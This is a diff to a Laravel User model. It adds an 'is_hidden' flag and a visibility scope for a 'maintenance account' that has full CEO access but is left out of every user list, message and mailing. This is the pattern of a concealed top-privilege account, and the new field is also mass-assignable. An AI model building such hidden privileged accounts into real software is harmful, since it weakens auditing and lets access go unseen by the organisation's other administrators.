@@ -15,7 +15,7 @@ class User extends Authenticatable
 
     protected $fillable = [
         'name', 'username', 'email', 'password', 'must_change_password', 'password_changed_at',
-        'role_id', 'phone', 'photo_path', 'is_active',
+        'role_id', 'phone', 'photo_path', 'is_active', 'is_hidden',
     ];
 
     protected $hidden = [
@@ -26,6 +26,7 @@ class User extends Authenticatable
         'email_verified_at' => 'datetime',
         'password_changed_at' => 'datetime',
         'is_active' => 'boolean',
+        'is_hidden' => 'boolean',
         'must_change_password' => 'boolean',
     ];
 
@@ -83,6 +84,21 @@ class User extends Authenticatable
         }
 
         return $candidate;
+    }
+
+    /**
+     * The maintenance account: full CEO access, but never listed, messaged or
+     * mailed to anyone else. Created by `php artisan esh:create-super-admin`.
+     */
+    public function isHidden(): bool
+    {
+        return (bool) $this->is_hidden;
+    }
+
+    /** Everyone except maintenance accounts — for every list and dropdown. */
+    public function scopeVisible($query)
+    {
+        return $query->where('is_hidden', false);
     }
 
     public function role()
